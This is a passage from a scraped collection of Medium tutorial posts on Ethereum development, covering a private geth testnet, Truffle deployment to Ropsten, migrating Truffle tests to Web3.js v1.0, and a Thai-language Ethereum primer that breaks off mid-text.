the wallets.As mentioned, the genesis file is not required and you can always use a predefined one which is provided if you run geth with the --dev option.It may be a good idea to familiarise yourself with the genesis file as the preallocated genesis file may not work for you, or just because you want more control over your project. Also, you probably want your initial wallets setup before you initialise your blockchain.It\u2019s also worth noting that as mentioned in this Ethereum blog post there is a python tool available for generating your own genesis.json file.Initialize the blockchain and creating an\u00a0accountThe initial genesis file will have to have nothing under the alloc section because we haven\u2019t created any accounts yet. We\u2019ll have to initialise the blockchain, then create a new account on it and then run the initialisation command again. The genesis.json file I\u2019ll be using is the one below.mkdir myblockchain myblockchain/datadircd myblockchaingeth account new --datadir \"$PWD/datadir\"# outputs something like this:Passphrase: ********Repeat passphrase: ********Address: {289a21e11cb10f77f7b17fa39a0f6613ec681293}cat > genesis.json <<EOF{    \"difficulty\": \"1\",    \"gasLimit\": \"9999999\",    \"config\": {        \"chainId\": 101,        \"homesteadBlock\": 0,        \"eip155Block\": 0,        \"eip158Block\": 0    },    \"alloc\": {        \"289a21e11cb10f77f7b17fa39a0f6613ec681293\": {            \"balance\": \"1000000\"        }    }}geth init --datadir \"$PWD/datadir\" genesis.json# Ctrl+D to exit the geth consoleWe have now created a chain and created an account.Note that the balance amount is in quotes \u201c1000000\u201d.You should now have a new chain with pre-allocation to the account mentioned above. You should now check what accounts exist on your chain and assign a default one:geth --datadir \"$PWD/datadir\" account list# Outputs something like:Account #0: {289a21e11cb10f77f7b17fa39a0f6613ec681293} keystore://..We will now launch the geth console with proper configuration, assign the account shown above as our default account and check our Ethereum balance.geth --identity \"MyPrivateBC\" --rpc --rpcport \"8545\" --rpccorsdomain \"*\" --datadir \"$PWD/datadir\" --port \"30303\" --nodiscover --rpcapi \"db,eth,net,web3\" --networkid 1900 --nat \"any\" console# Inside the console to get verify your account, # set a primary account and check its balance, run:> eth.accounts[\"0x289a21e11cb10f77f7b17fa39a0f6613ec681293\"]> primary = eth.accounts[0]0x289a21e11cb10f77f7b17fa39a0f6613ec681293> eth.getBalance(\"0x289a21e11cb10f77f7b17fa39a0f6613ec681293\")1000000# Ctrl+D to exit the consoleWe have now successfully created a blockchain, created an account on the blockchain and assigned it a million Ethereum.If you want to know more about the flags on the geth command, take a look at this page. Just a word of caution that the commands shown on that page are outdated and may not work. --nodiscover will make this blockchain a private one and the only way to for other nodes to connect to you is for them to add you manually.Creating your blockchain: connecting static\u00a0nodesIf you\u2019re running the console, your node will automatically connect to nodes with the same genesis file and networkId. If you follow the same setup instructions on another machine or even in an other directory you should be able to create a second node.Since your nodes are not discoverable, you need to define your static nodes. Static nodes are nodes that you always want to connect to. Your node will also automatically re-establish connection with these nodes if the connection is ever terminated.Static nodes contain information such as IP address/domain and port to connect on as well as the public key of the node to connect to. You need to create <datadir>/static_nodes.json file and add the enode URI to it. You can find your encode URI in the geth console after launching it:geth consoleWARN [10\u201316|14:51:10] No etherbase set and no accounts found as defaultINFO [10\u201316|14:51:10] Starting peer-to-peer node instance=Geth/v1.6.7-stable-ab5646c5/darwin-amd64/go1.8.3INFO [10\u201316|14:51:10] Allocated cache and file handles database=\"/Users/ali/Library/Ethereum/geth/chaindata\" cache=128 handles=1024INFO [10\u201316|14:51:10] Initialised chain configuration config=\"{ChainID: 1 Homestead: 1150000 DAO: 1920000 DAOSupport: true EIP150: 2463000 EIP155: 2675000 EIP158: 2675000 Metropolis: 9223372036854775807 Engine: ethash}\u201dINFO [10\u201316|14:51:10] Disk storage enabled for ethash caches dir=\"/Users/ali/Library/Ethereum/geth/ethash\" count=3INFO [10\u201316|14:51:10] Disk storage enabled for ethash DAGs dir=\"/Users/ali/.ethash\" count=2INFO [10\u201316|14:51:10] Initialising Ethereum protocol versions=\"[63 62] network=1INFO [10\u201316|14:51:10] Loaded most recent local header number=1536 hash=b787b8\u20267d0da3 td=39056428498300INFO [10\u201316|14:51:10] Loaded most recent local full block number=0 hash=d4e567\u2026cb8fa3 td=17179869184INFO [10\u201316|14:51:10] Loaded most recent local fast block number=1136 hash=533e56\u2026d0055d td=25929990157171INFO [10\u201316|14:51:10] Starting P2P networkingINFO [10\u201316|14:51:12] UDP listener up self=enode://1a84136963764e37cdb5768c23335175b5861419b8d747964e050f06dbfb9349dee0cc4a6e4f0f36c9a312423234e386c32e82c774a0253335cf1f7f6baf70c8@[::]:30303INFO [10\u201316|14:51:12] RLPx listener up self=enode://1a84136963764e37cdb5768c23335175b5861419b8d747964e050f06dbfb9349dee0cc4a6e4f0f36c9a312423234e386c32e82c774a0253335cf1f7f6baf70c8@[::]:30303INFO [10\u201316|14:51:12] IPC endpoint opened: /Users/ali/Library/Ethereum/geth.ipcWelcome to the Geth JavaScript console!# Ctrl+D to exitExit the console and then, create a static_nodes.json file\u200a\u2014\u200aa sample file is shown below. Make sure to replace [::] shown above with the IP address or domain name of your machine.[\"enode://17acb9097df2ce730feb3148e21ab6346ffd21a2221c21094993e3eb6fee56cff1c576b447323d52feb79ecb10d303a1f8f4e68c64050b25e6e2840e55b22392@192.168.1.1:30303?discport=0\",    \"enode://publickey@<ipaddress>:30303?discport=0\",\"enode://publickey@<ipaddress>:30303?discport=0\",\"enode://publickey@<ipaddress>:30303?discport=0\",]Make sure to add the URI for all the nodes you want to connect to. This includes your own node. Copy this file to every node in your private network. Now when you run the geth console your nodes should connect.Since this is not a simulated environment, you will need to enable mining on your nodes, otherwise any contracts your deploy or Ethereum you exchange will stay in a pending state.# In geth console> miner.start(0)> miner.stop()Deploy your smart contract on your private\u00a0testnetNow that we have our own private testnet setup. We can compile our smart contract and deploy to it. With the geth console running, navigate to your smart contract project directory. First, check the <smart contract project dir>/truffle.js file to make sure you have an environment configured pointing to your private testnet and then compile and deploy with truffletruffle compiletruffle migrate --network myPrivateTestNetThat it! You now have a private testnet setup to test your smart contracts.FinallyGive us a \ud83d\udc4f\ud83d\udc4f\ud83d\udc4f if you enjoyed this post it will motivate us to put out more great content.You made it to the end! You\u2019re awesome! We should hang out more often! To learn how to build great app and dApps, follow BCG Digital Ventures Engineering, BCG Digital Ventures and the author of this post, Ali Muzaffar.", "responses": ""}, {"title": "5 minute guide to deploying smart contracts with Truffle and\u00a0Ropsten", "author_name": "Nicole Zhu", "link": "https://medium.com/coinmonks/5-minute-guide-to-deploying-smart-contracts-with-truffle-and-ropsten-b3e30d5ee1e?source=search_post", "post_date": "Aug 24, 2018", "readtime": "3 min read", "upvotes": "169", "content": "5 minute guide to deploying smart contracts with Truffle and\u00a0RopstenA recommended & quick setup for DApp development with boilerplateNicole ZhuBlockedUnblockFollowFollowingAug 24, 2018You have various setup options for deploying, migrating, and accessing smart contracts. Depending on the level of control and visibility you want into the EVM (Ethereum Virtual Machine), you can choose from using an online IDE like Remix, to running a full Ethereum mining node via Geth.Of course, Truffle makes compiling & deploying smart contracts markedly easier, while still giving you visibility and control.1 Minute Shortcut: fork this boilerplate templateHere\u2019s a framework depicting both common setups and what we\u2019ll tackle today: the path in\u00a0blue.This tutorial\u00a0coversConfigure Truffle Framework to the Ropsten test networkUse it to deploy (or migrate) a contract instanceAccess the deployed instance and interact with it (via Truffle console)Make sure you already\u00a0haveSave your wallet mnemonic from MetamaskGet some test etherGet a Ropsten API key from InfuraDetailed Walkthrough1. Set up Trufflenpm install -g truffleMake an empty repository, cd into it, thentruffle initInstall HDWalletProvidernpm install --save truffle-hdwallet-provider2. Create your contractIn\u00a0./contracts create a new contract called HelloWorld.sol with the following code:pragma solidity ^0.4.23;contract HelloWorld {    function sayHello() public pure returns(string){        return(\u201chello world\u201d);    }}3. Deploy your contractIn\u00a0./migrations, create a deployment script specifically named 2_deploy_contracts.js with the following code:var HelloWorld = artifacts.require(\u201cHelloWorld\u201d);module.exports = function(deployer) {    deployer.deploy(HelloWorld, \u201chello\u201d);    // Additional contracts can be deployed here};4. Configure Ropsten network and the providerIn truffle.js, add the following snippet inside module.exports:Make sure to replace mnemonic and API_KEY with your own.Security note: remember to\u00a0.gitignore the file containing your wallet mnemonic!Now deploy (or migrate) your contract to Ropsten as follows. By default, Truffle only deploys to the local developer network.truffle deploy --network ropstenYou should see a console log as follows:Running migration: 1_initial_migration.jsDeploying Migrations\u2026\u2026 0xd01dd7...Migrations: 0xf741...Saving successful migration to network\u2026\u2026 0x78ed...Saving artifacts\u2026Running migration: 2_deploy_contracts.jsDeploying HelloWorld\u2026\u2026 0x0aa9...HelloWorld: [SAVE THIS ADDRESS!!]Saving successful migration to network\u2026\u2026 0xee95...Saving artifacts\u2026Tip: Make sure to save your contract address for future reference. If you lose it, proceed to Etherscan to examine your wallet address transactions.5. Access your deployed contractSet up your Truffle console to Ropsten network:truffle console --network ropstenAccess your deployed contract instance via:HelloWorld.deployed().then(function(instance){return instance });Or you can retrieve the instance by its public address via:web3.eth.contract(HelloWorld.abi, contractAddress)where HelloWorld.abi is the locally compile abi, and contractAddress is your publicly deployed contract instance.6. Finally, invoke contract function and say hello!HelloWorld.deployed().then(function(instance){return instance.sayHello()});Click to read today\u2019s top\u00a0story", "responses": "7"}, {"title": "Migrating your Truffle project to Web3\u00a0v1.0", "author_name": "Adrian Li", "link": "https://medium.com/@adrianmcli/migrating-your-truffle-project-to-web3-v1-0-ed3a56f11a4?source=search_post", "post_date": "Jul 13, 2018", "readtime": "4 min read", "upvotes": "250", "content": "Migrating your Truffle project to Web3\u00a0v1.0Adrian LiBlockedUnblockFollowFollowingJul 13, 2018The most popular library for calling into Ethereum smart contracts from the Javascript world is Web3.js (repo). In fact, Truffle (the popular Ethereum dapp framework) injects this within their own test environment.Unfortunately, the framework itself (and its official examples) use the 0.20.x version of Web3.js. And while v1.0 is still technically in beta, more and more people are using it because it provides an API that is more explicit and is easier to work with (like PromiEvents, I\u2019ll talk about this below).In this article, I\u2019ll show you how to convert your Truffle tests to use the new Web3.js v1.0 API rather than the older 0.20.x versions. In the process, I will introduce some of the major changes that the v1.0 API brings.Our smart\u00a0contractFor our example, let\u2019s use a simple increment/decrement counter with the following smart contract:pragma solidity ^0.4.24;contract Counter {  int count = 0;function increment() public {    count++;  }function decrement() public {    count--;  }function get() public view returns (int) {    return count;  }}Pretty basic, nothing too special about it. Now let\u2019s get into our Truffle tests.Our testsThis is what our test would look like if we followed the official Truffle documentation:This should also be pretty straight forward. We simply check that the initial value is 0, and that it can increment and decrement.Now let\u2019s see what it would look like with v1.0.It\u2019s largely the same, but there are two important differences:We use helpers from helpers.js (a file that we will create soon) so that we get access to the new Web3.js and its contract instance API.There is a new API for calling the smart contract methods.The helpersFirst, make sure you have a package.json file in your project. If not, simply run:npm init -yAnd then install the v1.0 version of web3:npm install web3Once we have that, create helpers.js in the same folder, then put the following into the file:For getWeb3, Since Truffle automagically injects the v0.20.x web3 into the global scope, we wrap it with our own v1.0 web3 and return the new one.For getContractInstance, because we want to make it a reusable function, we first take in the new web3, and then return a function that can create contract instances simply by passing in the contract name. So you can use it like this:// v1.0const web3 = getWeb3()const getInstance = getContractInstance(web3)const myContract = getInstance(\"MyContractName\")myContract.methods.myMethodName().call()Note that calling getInstance in the above example basically replaces the old way of getting a contract instance:// v0.20.xconst MyContract = artifacts.require(\"MyContractName\")const myContract = await MyContract.deployed()myContract.myMethodName.call()The new smart contract method\u00a0APICalling smart contract methods are now namespaced under methods of the contract instance object. The new API looks something like this, depending on whether you are calling a constant function or a mutating one (i.e. read vs write):instance.methods.myMethod().call()instance.methods.myMethod().send({ from: \"0x...\" })Notice that the arguments for your smart contract method is now separated from the transaction-specific options (e.g. from and gas options). This allows you to build up your method call before actually sending it.Previously, the final function call would contain all the arguments of the methods, with the final argument at the end being your transaction options.// Oldinstance.myMethod(123, true, { from: \"0x...\" })// Newinstance.methods.myMethod(123, true).send({ from: \"0x...\" })// Also newconst doTheThing = instance.methods.myMethod(123, true)doTheThing.send({ from: \"0x...\" })  // execute it laterPromiEventsOne of the most convenient things with the new API is that contract methods now return a PromiEvent, which is a hybrid of a conventional Promise and an event emitter.That means you can attach numerous event handlers for the lifecycle of the transaction. But since it\u2019s also just a regular Promise, you can use await or\u00a0.then() to do some work after the transaction has been mined. This provides a lot more flexibility for a better user experience.The following example is from the docs:web3.eth.sendTransaction({from: '0x123...', data: '0x432...'}).once('transactionHash', function(hash){ ... }).once('receipt', function(receipt){ ... }).on('confirmation', function(confNumber, receipt){ ... }).on('error', function(error){ ... }).then(function(receipt){    // will be fired once the receipt its mined});This would mean we can do something like this:const doSomething = instance.methods.myMethod(123, true)await doSomething.send({ from: \"0x...\" })  .once('transactionHash', (hash) => {     // notify user of the tx hash with an etherscan link  })  .on('confirmation', (confNumber) => {    // update UI to show the number of confirmations for this tx  })// the transaction has been mined, execute other code here!First, we created our method call and assigned it to doSomething. And then when we wanted to execute the transaction, we called\u00a0.send() on it and passed in our transaction options.From there, we immediately let the user know the transaction hash and give them a link to the relevant Etherscan page. Once the transaction has been mined, the code will resume execution below.As an added bonus, we are also able to show the number of confirmations onto the UI if we wanted to.Try it\u00a0outIt\u2019s my hope that the Truffle team can incorporate some of these ideas soon. It would be great to see more support for Web3.js v1.0. There\u2019s a severe lack of up-to-date and well-maintained Javascript libraries for working with Ethereum and I think this is the best way forward.In the mean time, I hope this article has helped you to better understand how to work with the new version of Web3.js.If you felt that this was helpful, please leave me a few claps and share!", "responses": "1"}, {"title": "Build your first Ethereum smart contract during lunch\u00a0break", "author_name": "Jeff Hu", "link": "https://medium.com/taipei-ethereum-meetup/build-your-first-ethereum-smart-contract-during-lunch-break-89b2a5a952d2?source=search_post", "post_date": "Aug 6, 2017", "readtime": "5 min read", "upvotes": "327", "content": "Build your first Ethereum smart contract during lunch\u00a0breakJeff HuBlockedUnblockFollowFollowingAug 6, 2017This tutorial promised to guide you through your first smart contract in 25 minutes. Sit tight and let\u2019s begin.Lunch break plays a crucial role in the daily life of many of us, so as Blockchain and the Bitcoin, who went viral on the globe in recent years. You could nearly tell the movement of Bitcoin price, by the peculiar look gave from the person you bumped into on street. Not long ago, the emergence of Ethereum brought the preciosity of blockchain technology back to community. Each of us, you and me, now have the pen to sign off a contract.3 steps in\u00a0totalGet what you needSwift guide through the codeDeploy and try it out", "responses": "1"}, {"title": "Blockchains for\u00a0Babies", "author_name": "BlockChannel", "link": "https://medium.com/blockchannel/blockchains-for-babies-595976eeb2bb?source=search_post", "post_date": "Jul 23, 2018", "readtime": "3 min read", "upvotes": "395", "content": "Blockchains for\u00a0BabiesBlocks, They\u2019re Not Just for Babies\u00a0Anymore.BlockChannelBlockedUnblockFollowFollowingJul 23, 2018Cross-Post: This post was originally written by Layne Haber, and was republished from the Connext blog with their explicit permission.Wait, what?As we\u2019ve been preparing for the launch of the Connext Pilot Program, we\u2019ve spoken at length with companies native and non-native to the Ethereum community. That experience has led us to the conclusion that complicated technical explanations are sometimes helpful, but more often they leave everyone (ourselves included) lost in the esoterica.Inspired by our favorite children\u2019s books, we\u2019re proud to present Blockchains for Babies, the first in a series that will later touch on state channels, plasma, and eventually sharding.Now, without further ado, we\u00a0present:", "responses": ""}, {"title": "[Ethereum] \u0e15\u0e2d\u0e19\u0e17\u0e35\u0e48 0\u00a0: \u0e1e\u0e37\u0e49\u0e19\u0e10\u0e32\u0e19 Ethereum, Smart Contract \u0e17\u0e35\u0e48\u0e04\u0e27\u0e23\u0e23\u0e39\u0e49\u0e41\u0e25\u0e30 Plasma \u0e04\u0e23\u0e48\u0e32\u0e27\u00a0\u0e46", "author_name": "Methus Kaewsaikao", "link": "https://medium.com/cochain/ethereum-%E0%B8%95%E0%B8%AD%E0%B8%99%E0%B8%97%E0%B8%B5%E0%B9%88-0-%E0%B8%9E%E0%B8%B7%E0%B9%89%E0%B8%99%E0%B8%90%E0%B8%B2%E0%B8%99-ethereum-smart-contract-%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%84%E0%B8%A7%E0%B8%A3%E0%B8%A3%E0%B8%B9%E0%B9%89%E0%B9%81%E0%B8%A5%E0%B8%B0-plasma-%E0%B8%84%E0%B8%A3%E0%B9%88%E0%B8%B2%E0%B8%A7-%E0%B9%86-c13b3c0b9b78?source=search_post", "post_date": "May 8", "readtime": "4 min read", "upvotes": "118", "content": "[Ethereum] \u0e15\u0e2d\u0e19\u0e17\u0e35\u0e48 0\u00a0: \u0e1e\u0e37\u0e49\u0e19\u0e10\u0e32\u0e19 Ethereum, Smart Contract \u0e17\u0e35\u0e48\u0e04\u0e27\u0e23\u0e23\u0e39\u0e49\u0e41\u0e25\u0e30 Plasma \u0e04\u0e23\u0e48\u0e32\u0e27\u00a0\u0e46Methus KaewsaikaoBlockedUnblockFollowFollowingMay 8\u0e43\u0e19\u0e1a\u0e17\u0e04\u0e27\u0e32\u0e21\u0e0b\u0e35\u0e23\u0e35\u0e48\u0e2a\u0e4c\u0e19\u0e35\u0e49\u0e40\u0e23\u0e32\u0e08\u0e30\u0e21\u0e32\u0e17\u0e33\u0e04\u0e27\u0e32\u0e21\u0e23\u0e39\u0e49\u0e08\u0e31\u0e01 Ethereum Blockchain \u0e41\u0e25\u0e30\u0e01\u0e32\u0e23\u0e40\u0e02\u0e35\u0e22\u0e19 Smart Contract \u0e1a\u0e19 Ethereum \u0e42\u0e14\u0e22\u0e01\u0e48\u0e2d\u0e19\u0e2d\u0e37\u0e48\u0e19\u0e40\u0e23\u0e32\u0e08\u0e30\u0e21\u0e32\u0e1b\u0e39\u0e1e\u0e37\u0e49\u0e19\u0e10\u0e32\u0e19\u0e04\u0e23\u0e48\u0e32\u0e27 \u0e46 \u0e40\u0e01\u0e35\u0e48\u0e22\u0e27\u0e01\u0e31\u0e1a Ethereum \u0e01\u0e31\u0e19\u0e01\u0e48\u0e2d\u0e19Ethereum \u0e16\u0e39\u0e01\u0e2a\u0e23\u0e49\u0e32\u0e07\u0e42\u0e14\u0e22 Vitalik Buterin \u0e2b\u0e25\u0e31\u0e07\u0e08\u0e32\u0e01\u0e43\u0e19\u0e1b\u0e35 2013 \u0e17\u0e35\u0e48 Vitalik \u0e44\u0e14\u0e49\u0e40\u0e2a\u0e19\u0e2d\u0e43\u0e2b\u0e49 Bitcoin \u0e21\u0e35 Scripting Language \u0e17\u0e35\u0e48\u0e40\u0e1b\u0e47\u0e19 Turing Complete \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e43\u0e2b\u0e49\u0e19\u0e31\u0e01\u0e1e\u0e31\u0e12\u0e19\u0e32\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e2a\u0e23\u0e49\u0e32\u0e07 Application \u0e1a\u0e19 Bitcoin \u0e44\u0e14\u0e49 \u0e41\u0e15\u0e48\u0e16\u0e39\u0e01\u0e1b\u0e0f\u0e34\u0e40\u0e2a\u0e18\u0e08\u0e32\u0e01\u0e01\u0e25\u0e38\u0e48\u0e21\u0e1c\u0e39\u0e49\u0e1e\u0e31\u0e12\u0e19\u0e32 BitcoinVitalik \u0e40\u0e25\u0e22\u0e40\u0e23\u0e34\u0e48\u0e21\u0e2a\u0e23\u0e49\u0e32\u0e07 Ethereum \u0e02\u0e36\u0e49\u0e19\u0e21\u0e32\u0e42\u0e14\u0e22\u0e21\u0e35\u0e04\u0e33\u0e08\u0e33\u0e01\u0e31\u0e14\u0e04\u0e27\u0e32\u0e21\u0e17\u0e35\u0e48\u0e27\u0e48\u0e32 \u201cDecentralised mining network and software development platform rolled into one\u201d \u0e01\u0e25\u0e48\u0e32\u0e27\u0e04\u0e37\u0e2d Ethereum \u0e40\u0e1b\u0e47\u0e19 Network \u0e02\u0e2d\u0e07\u0e2a\u0e34\u0e19\u0e17\u0e23\u0e31\u0e1e\u0e22\u0e4c\u0e17\u0e35\u0e48\u0e40\u0e01\u0e34\u0e14\u0e08\u0e32\u0e01\u0e01\u0e32\u0e23\u0e02\u0e38\u0e14\u0e40\u0e2b\u0e21\u0e37\u0e2d\u0e19 Bitcoin \u0e41\u0e15\u0e48\u0e40\u0e1e\u0e34\u0e48\u0e21\u0e04\u0e27\u0e32\u0e21\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e43\u0e19\u0e01\u0e32\u0e23\u0e40\u0e02\u0e35\u0e22\u0e19\u0e0b\u0e2d\u0e1f\u0e15\u0e4c\u0e41\u0e27\u0e23\u0e4c\u0e1a\u0e19\u0e2a\u0e34\u0e19\u0e17\u0e23\u0e31\u0e1e\u0e22\u0e4c\u0e40\u0e02\u0e49\u0e32\u0e44\u0e1b\u0e14\u0e49\u0e27\u0e22 \u0e0b\u0e36\u0e48\u0e07\u0e0b\u0e2d\u0e1f\u0e15\u0e4c\u0e41\u0e27\u0e23\u0e4c\u0e19\u0e31\u0e49\u0e19\u0e40\u0e23\u0e35\u0e22\u0e01\u0e01\u0e31\u0e19\u0e27\u0e48\u0e32 Smart ContractEthereum \u0e19\u0e31\u0e49\u0e19\u0e23\u0e30\u0e14\u0e21\u0e17\u0e38\u0e19\u0e14\u0e49\u0e27\u0e22 Bitcoin \u0e42\u0e14\u0e22\u0e43\u0e19\u0e23\u0e2d\u0e1a Pre-sale \u0e19\u0e31\u0e49\u0e19\u0e21\u0e35\u0e23\u0e32\u0e04\u0e32 2000 Ether/1 Bitcoin \u0e0b\u0e36\u0e48\u0e07 Ethereum \u0e19\u0e31\u0e1a\u0e27\u0e48\u0e32\u0e40\u0e1b\u0e47\u0e19 ICO \u0e15\u0e31\u0e27\u0e41\u0e23\u0e01 \u0e46 \u0e43\u0e19\u0e42\u0e25\u0e01Smart Contract \u0e1a\u0e19 Ethereum \u0e08\u0e30\u0e16\u0e39\u0e01\u0e40\u0e02\u0e35\u0e22\u0e19\u0e42\u0e14\u0e22\u0e20\u0e32\u0e29\u0e32 Solidity \u0e0b\u0e36\u0e48\u0e07\u0e40\u0e1b\u0e47\u0e19\u0e20\u0e32\u0e29\u0e32\u0e17\u0e35\u0e48\u0e16\u0e39\u0e01\u0e2d\u0e2d\u0e01\u0e41\u0e1a\u0e1a\u0e21\u0e32\u0e43\u0e2b\u0e49\u0e40\u0e02\u0e35\u0e22\u0e19\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e17\u0e33\u0e07\u0e32\u0e19\u0e1a\u0e19 Machine \u0e17\u0e35\u0e48\u0e40\u0e1b\u0e47\u0e19 Ethereum \u0e42\u0e14\u0e22\u0e40\u0e09\u0e1e\u0e32\u0e30 \u0e42\u0e14\u0e22\u0e08\u0e30\u0e21\u0e35\u0e2b\u0e19\u0e49\u0e32\u0e15\u0e32\u0e42\u0e04\u0e49\u0e14\u0e41\u0e1a\u0e1a\u0e19\u0e35\u0e49pragma solidity ^0.5.0;contract HelloWorld {    function sayHello() public pure returns(string memory){        return \"hello world\";    }}\u0e01\u0e32\u0e23\u0e40\u0e02\u0e35\u0e22\u0e19\u0e42\u0e1b\u0e23\u0e41\u0e01\u0e23\u0e21\u0e1a\u0e19 Ethereum \u0e19\u0e31\u0e49\u0e19\u0e44\u0e21\u0e48\u0e15\u0e49\u0e2d\u0e07\u0e21\u0e35 Backend Server \u0e40\u0e1e\u0e23\u0e32\u0e30 Ethereum \u0e19\u0e31\u0e48\u0e19\u0e41\u0e2b\u0e25\u0e30\u0e04\u0e37\u0e2d Backend Server \u0e41\u0e15\u0e48\u0e40\u0e1b\u0e47\u0e19 Server \u0e41\u0e1a\u0e1a\u0e01\u0e23\u0e30\u0e08\u0e32\u0e22\u0e28\u0e39\u0e19\u0e22\u0e4c\u0e01\u0e25\u0e32\u0e07\u0e42\u0e14\u0e22\u0e40\u0e21\u0e37\u0e48\u0e2d\u0e40\u0e23\u0e32\u0e21\u0e35 Smart Contract \u0e1a\u0e19 Ethereum \u0e41\u0e25\u0e49\u0e27 User \u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e43\u0e0a\u0e49 Client (\u0e40\u0e0a\u0e48\u0e19 Web Browser + Web3.js \u0e2b\u0e23\u0e37\u0e2d Myetherwallet + ABI) \u0e2a\u0e48\u0e07\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e44\u0e1b\u0e2b\u0e32 Ethereum \u0e44\u0e14\u0e49\u0e40\u0e25\u0e22\u0e42\u0e14\u0e22\u0e44\u0e21\u0e48\u0e15\u0e49\u0e2d\u0e07\u0e21\u0e35 Backend Server (Server \u0e40\u0e2d\u0e32\u0e44\u0e27\u0e49 Serve Frontend/\u0e23\u0e31\u0e1a Notification/Cache \u0e41\u0e25\u0e30\u0e40\u0e01\u0e47\u0e1a\u0e23\u0e39\u0e1b\u0e01\u0e47\u0e40\u0e1e\u0e35\u0e22\u0e07\u0e1e\u0e2d)\u0e40\u0e27\u0e47\u0e1a\u0e44\u0e0b\u0e15\u0e4c CryptoKitties \u0e0b\u0e36\u0e48\u0e07\u0e43\u0e0a\u0e49 Web3.js \u0e41\u0e25\u0e30 Login With\u00a0Metamask\u0e2b\u0e23\u0e37\u0e2d User \u0e08\u0e30\u0e43\u0e0a\u0e49 Myetherwallet \u0e44\u0e1b\u0e04\u0e38\u0e22\u0e01\u0e31\u0e1a CryptoKitties Smart Contract \u0e15\u0e23\u0e07 \u0e46\u00a0\u0e01\u0e47\u0e44\u0e14\u0e49Smart Contract \u0e08\u0e30\u0e15\u0e49\u0e2d\u0e07\u0e21\u0e35 Owner \u0e2b\u0e23\u0e37\u0e2d\u0e04\u0e19 Deploy \u0e40\u0e2a\u0e21\u0e2d \u0e42\u0e14\u0e22\u0e40\u0e21\u0e37\u0e48\u0e2d Deploy \u0e41\u0e25\u0e49\u0e27\u0e08\u0e30\u0e21\u0e35 Address \u0e02\u0e2d\u0e07\u0e15\u0e31\u0e27\u0e40\u0e2d\u0e07 \u0e40\u0e21\u0e37\u0e48\u0e2d\u0e21\u0e35 Address \u0e02\u0e2d\u0e07\u0e15\u0e31\u0e27\u0e40\u0e2d\u0e07\u0e01\u0e47\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e40\u0e01\u0e47\u0e1a\u0e40\u0e07\u0e34\u0e19\u0e44\u0e14\u0e49\u0e14\u0e49\u0e27\u0e22 \u0e16\u0e49\u0e32\u0e1c\u0e39\u0e49 Deploy \u0e15\u0e49\u0e2d\u0e07\u0e01\u0e32\u0e23\u0e19\u0e33\u0e40\u0e07\u0e34\u0e19\u0e2d\u0e2d\u0e01\u0e08\u0e32\u0e01 Smart Contract \u0e01\u0e47\u0e15\u0e49\u0e2d\u0e07\u0e40\u0e02\u0e35\u0e22\u0e19\u0e1f\u0e31\u0e07\u0e01\u0e4c\u0e0a\u0e31\u0e19\u0e43\u0e19\u0e01\u0e32\u0e23\u0e42\u0e2d\u0e19\u0e2d\u0e2d\u0e01\u0e44\u0e1b\u0e2b\u0e32\u0e15\u0e31\u0e27\u0e40\u0e2d\u0e07\u0e44\u0e27\u0e49\u0e14\u0e49\u0e27\u0e22Smart Contract \u0e02\u0e2d\u0e07 CryptoKitties \u0e21\u0e35 Address \u0e02\u0e2d\u0e07\u0e15\u0e31\u0e27\u0e40\u0e2d\u0e07 \u0e41\u0e25\u0e30\u0e21\u0e35\u0e40\u0e07\u0e34\u0e19\u0e2d\u0e22\u0e39\u0e48 67.34 Ether \u0e0b\u0e36\u0e48\u0e07\u0e40\u0e08\u0e49\u0e32\u0e02\u0e2d\u0e07 Smart Contract \u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e16\u0e2d\u0e19\u0e40\u0e07\u0e34\u0e19\u0e2d\u0e2d\u0e01\u0e44\u0e14\u0e49\u0e1c\u0e48\u0e32\u0e19\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07 withdrawBalanceUser \u0e1a\u0e19 Ethereum \u0e19\u0e31\u0e49\u0e19\u0e01\u0e47\u0e43\u0e0a\u0e49\u0e2b\u0e25\u0e31\u0e01\u0e01\u0e32\u0e23\u0e40\u0e14\u0e35\u0e22\u0e27\u0e01\u0e31\u0e19\u0e01\u0e31\u0e1a Blockchain \u0e17\u0e31\u0e48\u0e27\u0e44\u0e1b\u0e04\u0e37\u0e2d \u0e44\u0e21\u0e48\u0e21\u0e35 Username, Password \u0e21\u0e35\u0e40\u0e1e\u0e35\u0e22\u0e07\u0e41\u0e04\u0e48 Public Key \u0e0b\u0e36\u0e48\u0e07\u0e40\u0e1b\u0e47\u0e19\u0e15\u0e31\u0e27\u0e41\u0e17\u0e19\u0e02\u0e2d\u0e07 Username \u0e41\u0e25\u0e30 Private Key \u0e0b\u0e36\u0e48\u0e07\u0e40\u0e1b\u0e47\u0e19\u0e15\u0e31\u0e27\u0e41\u0e17\u0e19\u0e02\u0e2d\u0e07 Password \u0e41\u0e25\u0e30\u0e43\u0e0a\u0e49 Digital Signature \u0e2b\u0e23\u0e37\u0e2d\u0e25\u0e32\u0e22\u0e40\u0e0b\u0e47\u0e19\u0e14\u0e34\u0e08\u0e34\u0e15\u0e2d\u0e25\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e43\u0e0a\u0e49\u0e43\u0e19\u0e01\u0e32\u0e23\u0e2a\u0e48\u0e07\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e15\u0e48\u0e32\u0e07 \u0e46User \u0e17\u0e38\u0e01\u0e04\u0e19\u0e1a\u0e19 Ethereum \u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e2a\u0e48\u0e07\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e2b\u0e32 Smart Contract \u0e43\u0e14 \u0e46 \u0e01\u0e47\u0e44\u0e14\u0e49 \u0e0b\u0e36\u0e48\u0e07\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e17\u0e35\u0e48\u0e17\u0e33\u0e44\u0e14\u0e49\u0e01\u0e47\u0e15\u0e32\u0e21\u0e17\u0e35\u0e48 Smart Contract \u0e2d\u0e19\u0e38\u0e0d\u0e32\u0e15 \u0e44\u0e27\u0e49 